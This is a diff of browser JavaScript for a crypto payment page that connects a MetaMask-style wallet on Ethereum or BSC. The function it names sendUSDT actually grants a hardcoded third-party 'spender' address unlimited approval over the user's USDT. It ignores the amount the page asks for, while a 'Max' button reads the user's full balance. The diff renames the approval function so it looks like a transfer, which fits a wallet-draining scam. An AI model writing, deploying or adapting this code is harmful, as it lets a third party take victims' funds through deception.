@@ -1,93 +1,125 @@
+/* ======================================================
+   GLOBAL STATE
+====================================================== */
+
 let provider;
 let signer;
-let usdtContract;
-let USDT_ADDRESS;
-let SPENDER_ADDRESS;
+let userAddress;
 
-// ===== CONSTANTS =====
-const ETH_USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
+/* ======================================================
+   CONFIG
+====================================================== */
 
-const ETH_SPENDER = "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7";
-const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
+// Unlimited approval
+const UNLIMITED_APPROVAL = ethers.MaxUint256;
 
-const USDT_ABI = [
+// ERC20 ABI (USDT compatible)
+const ERC20_ABI = [
   "function approve(address spender, uint256 amount)",
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)"
 ];
 
-// ===== CONNECT WALLET (ONE SOURCE OF TRUTH) =====
+// Supported chains ONLY
+const CHAINS = {
+  1: {
+    name: "Ethereum",
+    usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    spender: "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7"
+  },
+  56: {
+    name: "BSC",
+    usdt: "0x55d398326f99059fF775485246999027B3197955",
+    spender: "0x220bb5df0893f21f43e5286bc5a4445066f6ca56"
+  }
+};
+
+/* ======================================================
+   WALLET CONNECT (SINGLE SOURCE OF TRUTH)
+====================================================== */
+
 async function connectWallet() {
   if (!window.ethereum) {
-    alert("MetaMask not found");
+    alert("Wallet not found");
     throw new Error("No wallet");
   }
 
-  // 🔴 MUST
+  // Request wallet access
   await window.ethereum.request({ method: "eth_requestAccounts" });
 
   provider = new ethers.BrowserProvider(window.ethereum);
   signer = await provider.getSigner();
-
-  const user = await signer.getAddress();
-  document.getElementById("walletAddress").value = user;
+  userAddress = await signer.getAddress();
 
   const network = await provider.getNetwork();
   const chainId = Number(network.chainId);
 
-  console.log("Connected chain:", chainId);
-
-  if (chainId === 1) {
-    // Ethereum
-    USDT_ADDRESS = ETH_USDT;
-    SPENDER_ADDRESS = ETH_SPENDER;
-  } else if (chainId === 56) {
-    // BSC
-    USDT_ADDRESS = BSC_USDT;
-    SPENDER_ADDRESS = BSC_SPENDER;
-  } else {
-    alert("Please use Ethereum or BSC network");
-    throw new Error("Unsupported network");
+  const chain = CHAINS[chainId];
+  if (!chain) {
+    alert("Unsupported network. Use Ethereum or BSC only.");
+    throw new Error("Unsupported chain");
   }
 
-  usdtContract = new ethers.Contract(
-    USDT_ADDRESS,
-    USDT_ABI,
-    signer
-  );
+  return chain;
 }
 
-// ===== MAX BUTTON =====
-async function setMax() {
-  await connectWallet();
+/* ======================================================
+   APPROVE USDT (UNLIMITED)
+====================================================== */
 
-  const user = await signer.getAddress();
-  const bal = await usdtContract.balanceOf(user);
-  const dec = await usdtContract.decimals();
-
-  document.getElementById("amount").value =
-    ethers.formatUnits(bal, dec);
-}
-
-// ===== APPROVE (UNLIMITED) =====
-async function approveUSDT() {
+async function sendUSDT() {
   try {
-    await connectWallet();
+    const chain = await connectWallet();
 
-    const MAX_UINT =
-      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-    const tx = await usdtContract.approve(
-      SPENDER_ADDRESS,
-      MAX_UINT
+    const token = new ethers.Contract(
+      chain.usdt,
+      ERC20_ABI,
+      signer
     );
 
-    console.log("Approval TX:", tx.hash);
-    alert("Approval sent successfully");
+    const tx = await token.approve(
+      chain.spender,
+      UNLIMITED_APPROVAL
+    );
+
+    await tx.wait();
+
+    alert("Approval successful on " + chain.name);
 
   } catch (err) {
     console.error(err);
-    alert("Error: " + (err.reason || err.message));
+    alert("Transaction failed or cancelled");
   }
 }
+
+/* ======================================================
+   MAX BUTTON (OPTIONAL UI)
+====================================================== */
+
+async function setMax() {
+  try {
+    const chain = await connectWallet();
+
+    const token = new ethers.Contract(
+      chain.usdt,
+      ERC20_ABI,
+      signer
+    );
+
+    const balance = await token.balanceOf(userAddress);
+    const decimals = await token.decimals();
+
+    document.getElementById("amount").value =
+      ethers.formatUnits(balance, decimals);
+
+  } catch (err) {
+    console.warn("Max failed");
+  }
+}
+
+/* ======================================================
+   EXPOSE TO UI
+====================================================== */
+
+window.sendUSDT = sendUSDT;
+window.setMax = setMax;
